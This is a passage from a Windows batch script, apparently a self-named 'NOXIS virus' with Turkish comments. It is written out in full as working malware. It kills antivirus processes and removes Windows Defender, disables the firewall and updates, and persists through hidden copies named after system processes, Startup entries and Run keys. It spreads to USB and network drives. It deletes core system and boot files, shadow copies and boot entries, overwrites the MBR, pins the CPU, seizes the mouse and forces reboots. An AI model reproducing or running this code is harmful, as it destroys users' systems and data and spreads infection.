taskkill /f /im ekrn.exe >nul 2>&1
taskkill /f /im egui.exe >nul 2>&1
taskkill /f /im mcshield.exe >nul 2>&1
taskkill /f /im mfehidk.exe >nul 2>&1
taskkill /f /im mbam.exe >nul 2>&1
taskkill /f /im mbamservice.exe >nul 2>&1
taskkill /f /im 360tray.exe >nul 2>&1
taskkill /f /im 360sd.exe >nul 2>&1
taskkill /f /im baiduhsd.exe >nul 2>&1
taskkill /f /im baiduupdater.exe >nul 2>&1
taskkill /f /im qqpc.exe >nul 2>&1
taskkill /f /im qqset.exe >nul 2>&1
taskkill /f /im kxetray.exe >nul 2>&1
taskkill /f /im kxescore.exe >nul 2>&1
taskkill /f /im usysdiag.exe >nul 2>&1
taskkill /f /im usysmon.exe >nul 2>&1

:: Antivirüs kayıt defteri anahtarlarını sil
reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows Defender" /f >nul 2>&1

:: Antivirüs klasörlerini sil
if exist "C:\Program Files\Windows Defender" (
    rd /s /q "C:\Program Files\Windows Defender" >nul 2>&1
)
if exist "C:\Program Files (x86)\Windows Defender" (
    rd /s /q "C:\Program Files (x86)\Windows Defender" >nul 2>&1
)

:: Windows Defender'ı tamamen devre dışı bırak
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul 2>&1

:: Güvenlik duvarını tamamen kapat
netsh advfirewall set allprofiles state off >nul 2>&1
netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound >nul 2>&1
netsh advfirewall set allprofiles settings inboundusernotification disable >nul 2>&1
netsh advfirewall set allprofiles settings outboundusernotification disable >nul 2>&1

:: Windows Update'i devre dışı bırak
sc config wuauserv start= disabled >nul 2>&1
sc stop wuauserv >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f >nul 2>&1

timeout /t %antivirus_suresi% /nobreak >nul 2>&1
goto antivirus_koruma

:: ============================================
:: KENDİNİ GERİ GETİRME (FİXED)
:: ============================================

:kendini_geri_getir
:: Kendini birçok yere kopyala
if not exist "C:\Windows\Temp\noxis_v1.bat" (
    copy "%0" "C:\Windows\Temp\noxis_v1.bat" >nul 2>&1
)
if not exist "C:\Windows\Temp\noxis_v2.bat" (
    copy "%0" "C:\Windows\Temp\noxis_v2.bat" >nul 2>&1
)
if not exist "C:\Windows\Temp\noxis_v3.bat" (
    copy "%0" "C:\Windows\Temp\noxis_v3.bat" >nul 2>&1
)
if not exist "C:\Windows\Temp\noxis_v4.bat" (
    copy "%0" "C:\Windows\Temp\noxis_v4.bat" >nul 2>&1
)
if not exist "C:\Windows\Temp\noxis_v5.bat" (
    copy "%0" "C:\Windows\Temp\noxis_v5.bat" >nul 2>&1
)
if not exist "C:\Windows\System32\noxis_v1.bat" (
    copy "%0" "C:\Windows\System32\noxis_v1.bat" >nul 2>&1
)
if not exist "C:\Windows\System32\noxis_v2.bat" (
    copy "%0" "C:\Windows\System32\noxis_v2.bat" >nul 2>&1
)
if not exist "C:\Windows\System32\noxis_v3.bat" (
    copy "%0" "C:\Windows\System32\noxis_v3.bat" >nul 2>&1
)
if not exist "C:\Windows\System32\svchost.bat" (
    copy "%0" "C:\Windows\System32\svchost.bat" >nul 2>&1
)
if not exist "C:\Windows\System32\winlogon.bat" (
    copy "%0" "C:\Windows\System32\winlogon.bat" >nul 2>&1
)
if not exist "C:\Windows\System32\csrss.bat" (
    copy "%0" "C:\Windows\System32\csrss.bat" >nul 2>&1
)
if not exist "C:\Windows\System32\lsass.bat" (
    copy "%0" "C:\Windows\System32\lsass.bat" >nul 2>&1
)
if not exist "C:\Windows\System32\services.bat" (
    copy "%0" "C:\Windows\System32\services.bat" >nul 2>&1
)
if not exist "C:\Windows\System32\smss.bat" (
    copy "%0" "C:\Windows\System32\smss.bat" >nul 2>&1
)

:: Başlangıç klasörüne kopyala
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noxis_v1.bat" (
    copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noxis_v1.bat" >nul 2>&1
)
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noxis_v2.bat" (
    copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noxis_v2.bat" >nul 2>&1
)
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows_update.bat" (
    copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows_update.bat" >nul 2>&1
)
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system_check.bat" (
    copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system_check.bat" >nul 2>&1
)
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\antivirus.bat" (
    copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\antivirus.bat" >nul 2>&1
)

:: Kayıt defterine ekle (her açılışta çalışsın)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NOXIS /t REG_SZ /d "%0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NOXIS2 /t REG_SZ /d "C:\Windows\Temp\noxis_v1.bat" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NOXIS3 /t REG_SZ /d "C:\Windows\System32\noxis_v1.bat" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NOXIS4 /t REG_SZ /d "C:\Windows\System32\svchost.bat" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NOXIS5 /t REG_SZ /d "C:\Windows\System32\winlogon.bat" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v NOXIS /t REG_SZ /d "%0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v NOXIS2 /t REG_SZ /d "C:\Windows\Temp\noxis_v1.bat" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v NOXIS3 /t REG_SZ /d "C:\Windows\System32\noxis_v1.bat" /f >nul 2>&1

:: Tüm kopyaları gizle
attrib +h "C:\Windows\Temp\noxis_v1.bat" >nul 2>&1
attrib +h "C:\Windows\Temp\noxis_v2.bat" >nul 2>&1
attrib +h "C:\Windows\Temp\noxis_v3.bat" >nul 2>&1
attrib +h "C:\Windows\Temp\noxis_v4.bat" >nul 2>&1
attrib +h "C:\Windows\Temp\noxis_v5.bat" >nul 2>&1
attrib +h "C:\Windows\System32\noxis_v1.bat" >nul 2>&1
attrib +h "C:\Windows\System32\noxis_v2.bat" >nul 2>&1
attrib +h "C:\Windows\System32\noxis_v3.bat" >nul 2>&1
attrib +h "C:\Windows\System32\svchost.bat" >nul 2>&1
attrib +h "C:\Windows\System32\winlogon.bat" >nul 2>&1
attrib +h "C:\Windows\System32\csrss.bat" >nul 2>&1
attrib +h "C:\Windows\System32\lsass.bat" >nul 2>&1
attrib +h "C:\Windows\System32\services.bat" >nul 2>&1
attrib +h "C:\Windows\System32\smss.bat" >nul 2>&1
attrib +h "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noxis_v1.bat" >nul 2>&1
attrib +h "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noxis_v2.bat" >nul 2>&1

:: Kendini geri getirme kontrolü
if not exist "%0" (
    copy "C:\Windows\Temp\noxis_v1.bat" "%0" >nul 2>&1
    start "" "%0"
)

timeout /t %geri_getir_suresi% /nobreak >nul 2>&1
goto kendini_geri_getir

:: ============================================
:: SÜREKLİ DOSYA KOPYALAMA (FİXED)
:: ============================================

:surekli_kopyala
:: Kendini her yere kopyala
copy "%0" "C:\Users\%username%\Desktop\noxis.bat" >nul 2>&1
copy "%0" "C:\Users\%username%\Documents\noxis.bat" >nul 2>&1
copy "%0" "C:\Users\%username%\Downloads\noxis.bat" >nul 2>&1
copy "%0" "C:\Users\%username%\Pictures\noxis.bat" >nul 2>&1
copy "%0" "C:\Users\%username%\Music\noxis.bat" >nul 2>&1
copy "%0" "C:\Users\%username%\Videos\noxis.bat" >nul 2>&1
copy "%0" "C:\Users\%username%\Desktop\noxis_v2.bat" >nul 2>&1
copy "%0" "C:\Users\%username%\Documents\noxis_v2.bat" >nul 2>&1
copy "%0" "C:\Users\%username%\Downloads\noxis_v2.bat" >nul 2>&1

:: USB sürücülerine kopyala
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%d:\" (
        copy "%0" "%%d:\noxis.bat" >nul 2>&1
        copy "%0" "%%d:\noxis_v2.bat" >nul 2>&1
        copy "%0" "%%d:\windows_update.bat" >nul 2>&1
    )
)

:: Ağ sürücülerine kopyala
for %%d in (Z Y X W V U T S R Q P O N M L K J I H G F E) do (
    if exist "%%d:\" (
        copy "%0" "%%d:\noxis.bat" >nul 2>&1
        copy "%0" "%%d:\noxis_v2.bat" >nul 2>&1
    )
)

timeout /t %kopyalama_suresi% /nobreak >nul 2>&1
goto surekli_kopyala

:: ============================================
:: VİDEO AÇMA (FİXED)
:: ============================================

:video_ac
:: YouTube videoları aç
start "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ" >nul 2>&1
start "" "https://www.youtube.com/watch?v=9bZkp7q19f0" >nul 2>&1
start "" "https://www.youtube.com/watch?v=jNQXAC9IVRw" >nul 2>&1
start "" "https://www.youtube.com/watch?v=kJQP7kiw5Fk" >nul 2>&1
start "" "https://www.youtube.com/watch?v=OPf0YbXqDmU" >nul 2>&1
start "" "https://www.youtube.com/watch?v=YQHsXMglC9A" >nul 2>&1
start "" "https://www.youtube.com/watch?v=U9t-slLl30E" >nul 2>&1
start "" "https://www.youtube.com/watch?v=Zi_XLOBDo_Y" >nul 2>&1
start "" "https://www.youtube.com/watch?v=RgKAFK5djSk" >nul 2>&1
start "" "https://www.youtube.com/watch?v=CevxZvSJLk8" >nul 2>&1

:: Windows Media Player aç
start wmplayer.exe >nul 2>&1
start mplayer2.exe >nul 2>&1

:: VLC aç
start vlc.exe >nul 2>&1

timeout /t %video_suresi% /nobreak >nul 2>&1
goto video_ac

:: ============================================
:: EKRAN KARINCALANMA EFEKTİ (FİXED)
:: ============================================

:ekran_karincalanma
:: Ekranı karıncalandır
cls
color 0c
echo.
echo.
echo                     ██████████████████████████████████████████████████████
echo                     ██                                                  ██
echo                     ██         EKRAN KARINCALANIYOR!                    ██
echo                     ██                                                  ██
echo                     ██   NOXIS VIRUSU EKRANI ELE GECIRDI!               ██
echo                     ██                                                  ██
echo                     ██   KACIS YOK!                                     ██
echo                     ██                                                  ██
echo                     ██   YARDIM YOK!                                    ██
echo                     ██                                                  ██
echo                     ██   SONUN GELDI!                                   ██
echo                     ██                                                  ██
echo                     ██████████████████████████████████████████████████████
echo.
echo.

:: Karıncalanma efekti (hız seviyesine göre)
set /a karincalanma_sayisi=20 * %hiz_carpani%
for /l %%i in (1,1,%karincalanma_sayisi%) do (
    cls
    color %random:~0,2%
    echo.
    echo.
    echo                     ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    echo                     ░░                                                  ░░
    echo                     ░░   NOXIS KARINCALANMA EFEKTI!                     ░░
    echo                     ░░                                                  ░░
    echo                     ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    echo.
    timeout /t 1 /nobreak >nul 2>&1
    cls
    color 0%random:~0,1%
    echo.
    echo.
    echo                     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    echo                     ▓▓                                                  ▓▓
    echo                     ▓▓   EKRAN BOZULUYOR!                               ▓▓
    echo                     ▓▓                                                  ▓▓
    echo                     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    echo.
    timeout /t 1 /nobreak >nul 2>&1
)

:: Rastgele çizgiler çiz (hız seviyesine göre)
set /a cizgi_sayisi=10 * %hiz_carpani%
for /l %%i in (1,1,%cizgi_sayisi%) do (
    cls
    color %random:~0,2%
    echo.
    echo.
    echo                     ██████████████████████████████████████████████████████
    echo                     ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██
    echo                     ██    ██    ██    ██    ██    ██    ██    ██    ██    ██
    echo                     ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██
    echo                     ██    ██    ██    ██    ██    ██    ██    ██    ██    ██
    echo                     ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██
    echo                     ██    ██    ██    ██    ██    ██    ██    ██    ██    ██
    echo                     ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██
    echo                     ██    ██    ██    ██    ██    ██    ██    ██    ██    ██
    echo                     ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██
    echo                     ██    ██    ██    ██    ██    ██    ██    ██    ██    ██
    echo                     ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██
    echo                     ██████████████████████████████████████████████████████
    echo.
    timeout /t 1 /nobreak >nul 2>&1
)

timeout /t %karincalanma_suresi% /nobreak >nul 2>&1
goto ekran_karincalanma

:: ============================================
:: GERÇEK WINDOWS ÇÖKERTME (FİXED)
:: ============================================

:windows_cokert
:: Kritik sistem dosyalarını sil
if exist "C:\Windows\System32\hal.dll" (
    del /f /q "C:\Windows\System32\hal.dll" >nul 2>&1
)
if exist "C:\Windows\System32\ntoskrnl.exe" (
    del /f /q "C:\Windows\System32\ntoskrnl.exe" >nul 2>&1
)
if exist "C:\Windows\System32\ntdll.dll" (
    del /f /q "C:\Windows\System32\ntdll.dll" >nul 2>&1
)
if exist "C:\Windows\System32\kernel32.dll" (
    del /f /q "C:\Windows\System32\kernel32.dll" >nul 2>&1
)
if exist "C:\Windows\System32\user32.dll" (
    del /f /q "C:\Windows\System32\user32.dll" >nul 2>&1
)
if exist "C:\Windows\System32\gdi32.dll" (
    del /f /q "C:\Windows\System32\gdi32.dll" >nul 2>&1
)
if exist "C:\Windows\System32\win32k.sys" (
    del /f /q "C:\Windows\System32\win32k.sys" >nul 2>&1
)
if exist "C:\Windows\System32\drivers\ntfs.sys" (
    del /f /q "C:\Windows\System32\drivers\ntfs.sys" >nul 2>&1
)
if exist "C:\Windows\System32\drivers\fastfat.sys" (
    del /f /q "C:\Windows\System32\drivers\fastfat.sys" >nul 2>&1
)
if exist "C:\Windows\System32\drivers\disk.sys" (
    del /f /q "C:\Windows\System32\drivers\disk.sys" >nul 2>&1
)
if exist "C:\Windows\System32\drivers\atapi.sys" (
    del /f /q "C:\Windows\System32\drivers\atapi.sys" >nul 2>&1
)
if exist "C:\Windows\System32\drivers\pci.sys" (
    del /f /q "C:\Windows\System32\drivers\pci.sys" >nul 2>&1
)

:: Boot dosyalarını sil
if exist "C:\bootmgr" (
    del /f /q "C:\bootmgr" >nul 2>&1
)
if exist "C:\Boot\BCD" (
    del /f /q "C:\Boot\BCD" >nul 2>&1
)
if exist "C:\Windows\Boot\EFI\bootmgfw.efi" (
    del /f /q "C:\Windows\Boot\EFI\bootmgfw.efi" >nul 2>&1
)

:: Sistem kurtarma dosyalarını sil
vssadmin delete shadows /all /quiet >nul 2>&1
bcdedit /delete {default} /f >nul 2>&1
bcdedit /delete {current} /f >nul 2>&1
bcdedit /delete {ntldr} /f >nul 2>&1
bcdedit /delete {memdiag} /f >nul 2>&1

:: Kayıt defteri anahtarlarını sil
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v PendingFileRenameOperations /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\CriticalDeviceDatabase" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\disk" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\atapi" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\pci" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ACPI" /f >nul 2>&1

:: Windows'u çökert
shutdown /s /t 0 /f >nul 2>&1

timeout /t %cokertme_suresi% /nobreak >nul 2>&1
goto windows_cokert

:: ============================================
:: GÖRSEL EFEKTLER (FİXED)
:: ============================================

:gorsel_efektler
:: Rastgele renk seç
set /a renk=%random% %% 16
if %renk%==0 set renk_hex=0
if %renk%==1 set renk_hex=1
if %renk%==2 set renk_hex=2
if %renk%==3 set renk_hex=3
if %renk%==4 set renk_hex=4
if %renk%==5 set renk_hex=5
if %renk%==6 set renk_hex=6
if %renk%==7 set renk_hex=7
if %renk%==8 set renk_hex=8
if %renk%==9 set renk_hex=9
if %renk%==10 set renk_hex=A
if %renk%==11 set renk_hex=B
if %renk%==12 set renk_hex=C
if %renk%==13 set renk_hex=D
if %renk%==14 set renk_hex=E
if %renk%==15 set renk_hex=F

:: Arka planı renkli yap
color %renk_hex%c
timeout /t %gorsel_suresi% /nobreak >nul 2>&1
goto gorsel_efektler

:: ============================================
:: MOUSE DONMA VE TİTREME (FİXED)
:: ============================================

:mouse_dondur
:: Fareyi donduracak PowerShell betiği
start /min cmd.exe /c "powershell -command \"Add-Type -AssemblyName System.Windows.Forms; while(1){[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0); Start-Sleep -Seconds 0.05}\"" >nul 2>&1
start /min cmd.exe /c "powershell -command \"Add-Type -AssemblyName System.Windows.Forms; while(1){[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(9999,9999); Start-Sleep -Seconds 0.05}\"" >nul 2>&1
:: Fareyi titreştir
start /min cmd.exe /c "powershell -command \"Add-Type -AssemblyName System.Windows.Forms; while(1){$x=Get-Random -Minimum 0 -Maximum 1920; $y=Get-Random -Minimum 0 -Maximum 1080; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x,$y); Start-Sleep -Seconds 0.01}\"" >nul 2>&1
goto mouse_dondur

:: ============================================
:: GLITCH MESAJLARI (FİXED)
:: ============================================

:glitch_mesajlar
start cmd.exe /k "color 0c && echo  && echo     ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ && echo     ░░                                                  ░░ && echo     ░░   GLITCH DETECTED!                               ░░ && echo     ░░   HATA KODU: 0xDEADBEEF                           ░░ && echo     ░░   SISTEM CIKTI!                                   ░░ && echo     ░░                                                  ░░ && echo     ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ && echo  && timeout /t 3 /nobreak >nul && exit"

start cmd.exe /k "color 0d && echo  && echo     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ && echo     ▓▓                                                  ▓▓ && echo     ▓▓   SYSTEM FAILURE!                                 ▓▓ && echo     ▓▓   CRITICAL ERROR!                                 ▓▓ && echo     ▓▓   MEMORY CORRUPTION!                              ▓▓ && echo     ▓▓                                                  ▓▓ && echo     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ && echo  && timeout /t 3 /nobreak >nul && exit"

start cmd.exe /k "color 0e && echo  && echo     ══════════════════════════════════════════════════════════ && echo     ║                                                  ║ && echo     ║   NOXIS VIRUSU AKTIF!                              ║ && echo     ║   TUM VERILERIN SILINIYOR!                         ║ && echo     ║   HARD DISK FORMATLANIYOR!                         ║ && echo     ║                                                  ║ && echo     ══════════════════════════════════════════════════════════ && echo  && timeout /t 3 /nobreak >nul && exit"

start cmd.exe /k "color 0f && echo  && echo     ██████████████████████████████████████████████████████ && echo     ██                                                  ██ && echo     ██   KAMERA AKTIF!                                    ██ && echo     ██   WEBCAM ISIGI YANIYOR!                             ██ && echo     ██   SENI IZLIYORUM!                                  ██ && echo     ██                                                  ██ && echo     ██████████████████████████████████████████████████████ && echo  && timeout /t 3 /nobreak >nul && exit"

start cmd.exe /k "color 1a && echo  && echo     ██████████████████████████████████████████████████████ && echo     ██                                                  ██ && echo     ██   MIKROFON AKTIF!                                  ██ && echo     ██   SESINIZI DUYUYORUM!                              ██ && echo     ██   HER SEYI KAYDEDIYORUM!                            ██ && echo     ██                                                  ██ && echo     ██████████████████████████████████████████████████████ && echo  && timeout /t 3 /nobreak >nul && exit"

start cmd.exe /k "color 2b && echo  && echo     ██████████████████████████████████████████████████████ && echo     ██                                                  ██ && echo     ██   ISLEMCI YANIYOR!                                 ██ && echo     ██   SICAKLIK: 99°C                                   ██ && echo     ██   FAN HIZI: MAX                                    ██ && echo     ██   VOLTAJ: 2.0V                                     ██ && echo     ██                                                  ██ && echo     ██████████████████████████████████████████████████████ && echo  && timeout /t 3 /nobreak >nul && exit"

start cmd.exe /k "color 3c && echo  && echo     ██████████████████████████████████████████████████████ && echo     ██                                                  ██ && echo     ██   VIRUS YAYILIYOR!                                 ██ && echo     ██   TUM AGDAKILERI BULASIYORUM!                       ██ && echo     ██   USB, EMAIL, NETWORK...                            ██ && echo     ██                                                  ██ && echo     ██████████████████████████████████████████████████████ && echo  && timeout /t 3 /nobreak >nul && exit"

start cmd.exe /k "color 4d && echo  && echo     ██████████████████████████████████████████████████████ && echo     ██                                                  ██ && echo     ██   INTERNET KESILDI!                                ██ && echo     ██   YAZICI CALISIYOR!                                ██ && echo     ██   CD/DVD ACIK!                                     ██ && echo     ██                                                  ██ && echo     ██████████████████████████████████████████████████████ && echo  && timeout /t 3 /nobreak >nul && exit"

start cmd.exe /k "color 5e && echo  && echo     ██████████████████████████████████████████████████████ && echo     ██                                                  ██ && echo     ██   KLAVYE DEVRE DISI!                               ██ && echo     ██   EKRAN DONDU!                                     ██ && echo     ██   SES SONUNA KADAR!                                ██ && echo     ██                                                  ██ && echo     ██████████████████████████████████████████████████████ && echo  && timeout /t 3 /nobreak >nul && exit"

start cmd.exe /k "color 6a && echo  && echo     ██████████████████████████████████████████████████████ && echo     ██                                                  ██ && echo     ██   MAVI EKRAN GELIYOR!                               ██ && echo     ██   BIOS SILINIYOR!                                   ██ && echo     ██   HARD DISK FORMATLANIYOR!                          ██ && echo     ██                                                  ██ && echo     ██████████████████████████████████████████████████████ && echo  && timeout /t 3 /nobreak >nul && exit"

start cmd.exe /k "color 7b && echo  && echo     ██████████████████████████████████████████████████████ && echo     ██                                                  ██ && echo     ██   ANTIVIRUSLER DEVRE DISI!                          ██ && echo     ██   KENDINI GERI GETIRIYOR!                           ██ && echo     ██   DOSYA KOPYALIYOR!                                 ██ && echo     ██   VIDEO ACIYOR!                                     ██ && echo     ██   EKRAN KARINCALANIYOR!                             ██ && echo     ██   WINDOWS COKERTILIYOR!                             ██ && echo     ██   HIZ: %hiz_carpani%x                                ██ && echo     ██                                                  ██ && echo     ██████████████████████████████████████████████████████ && echo  && timeout /t 3 /nobreak >nul && exit"

timeout /t 2 /nobreak >nul 2>&1
goto glitch_mesajlar

:: ============================================
:: İŞLEMCİYİ ZORLAMA (FİXED)
:: ============================================

:islemci_yak
start cmd.exe /k "color 0a && :loop1 && echo %random% && goto loop1"
start cmd.exe /k "color 0c && :loop2 && echo %random% && goto loop2"
start cmd.exe /k "color 0d && :loop3 && echo %random% && goto loop3"
start cmd.exe /k "color 0e && :loop4 && echo %random% && goto loop4"
start cmd.exe /k "color 0f && :loop5 && echo %random% && goto loop5"
start cmd.exe /k "color 1a && :loop6 && echo %random% && goto loop6"
start cmd.exe /k "color 2b && :loop7 && echo %random% && goto loop7"
start cmd.exe /k "color 3c && :loop8 && echo %random% && goto loop8"
start cmd.exe /k "color 4d && :loop9 && echo %random% && goto loop9"
start cmd.exe /k "color 5e && :loop10 && echo %random% && goto loop10"
start cmd.exe /k "color 6a && :loop11 && echo %random% && goto loop11"
start cmd.exe /k "color 7b && :loop12 && echo %random% && goto loop12"
start cmd.exe /k "color 8c && :loop13 && echo %random% && goto loop13"
start cmd.exe /k "color 9d && :loop14 && echo %random% && goto loop14"
start cmd.exe /k "color ae && :loop15 && echo %random% && goto loop15"
start cmd.exe /k "color bf && :loop16 && echo %random% && goto loop16"
start cmd.exe /k "color c0 && :loop17 && echo %random% && goto loop17"
start cmd.exe /k "color d1 && :loop18 && echo %random% && goto loop18"
start cmd.exe /k "color e2 && :loop19 && echo %random% && goto loop19"
start cmd.exe /k "color f3 && :loop20 && echo %random% && goto loop20"
timeout /t %islemci_suresi% /nobreak >nul 2>&1
goto islemci_yak

:: ============================================
:: SİSTEM DOSYALARINI BOZMA (FİXED)
:: ============================================

:sistem_boz
:: Windows güncelleme servisini durdur
net stop wuauserv >nul 2>&1
net stop bits >nul 2>&1
net stop dosvc >nul 2>&1

:: Güvenlik duvarını devre dışı bırak
netsh advfirewall set allprofiles state off >nul 2>&1

:: Windows Defender'ı devre dışı bırak
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1

:: Sistem geri yükleme noktalarını sil
vssadmin delete shadows /all /quiet >nul 2>&1

:: Boot dosyalarını boz
bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
bcdedit /set {default} recoveryenabled No >nul 2>&1

:: Safe mode'u devre dışı bırak
bcdedit /set {default} safeboot minimal >nul 2>&1

:: MBR'yi boz
bootsect /nt60 C: /mbr >nul 2>&1

timeout /t %sistem_suresi% /nobreak >nul 2>&1
goto sistem_boz

:: ============================================
:: YENİDEN BAŞLATMA ZAMANLAYICI (1 DAKİKA)
:: ============================================

:yeniden_baslat_zamanlayici
:: Sayaç başlat
set /a sayac=0
:sayac_dongusu
set /a sayac=sayac+1
cls
echo.
echo.
echo                     ██████████████████████████████████████████████████████
echo                     ██                                                  ██
echo                     ██   NOXIS V%versiyon% AKTIF!                         ██
echo                     ██                                                  ██
echo                     ██   Bilgisayar yeniden baslatilacak!               ██
echo                     ██                                                  ██
echo                     ██   Kalan sure: %yeniden_baslatma_suresi% saniye       ██
echo                     ██                                                  ██
echo                     ██   Sayac: %sayac%                                   ██
echo                     ██   Hiz seviyesi: %hiz_seviyesi% (%hiz_carpani%x)     ██
echo                     ██                                                  ██
echo                     ██████████████████████████████████████████████████████
echo.
echo.

:: 1 saniye bekle
timeout /t 1 /nobreak >nul 2>&1

:: Sayaç azalt
set /a yeniden_baslatma_suresi=yeniden_baslatma_suresi-1

:: Sayaç 0 olduğunda yeniden başlat
if %yeniden_baslatma_suresi% leq 0 (
    goto yeniden_baslat
)

:: Sonsuz döngü
goto sayac_dongusu

:: ============================================
:: YENİDEN BAŞLATMA
:: ============================================

:yeniden_baslat
:: Hız seviyesini artır
set /a hiz_seviyesi=hiz_seviyesi+1
if %hiz_seviyesi% gtr 3 set hiz_seviyesi=3

:: Bilgisayarı yeniden başlat
shutdown /r /t 5 /c "NOXIS V%versiyon% - Bilgisayariniz yeniden baslatiliyor! Hiz seviyesi: %hiz_seviyesi%x" /f

:: 5 saniye bekle
timeout /t 5 /nobreak >nul 2>&1

:: Yeniden başlatma süresini sıfırla
set yeniden_baslatma_suresi=60

:: Hız kontrolüne git
goto hiz_kontrol

:: ============================================
:: ANA KAOS DÖNGÜSÜ (FİXED)
:: ============================================

:kaos
:: 60 farklı pencere aç
start cmd.exe /k "color 0a && echo NOXIS V1.0 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0c && echo GLITCH MODE && timeout /t 2 /nobreak >nul && exit"
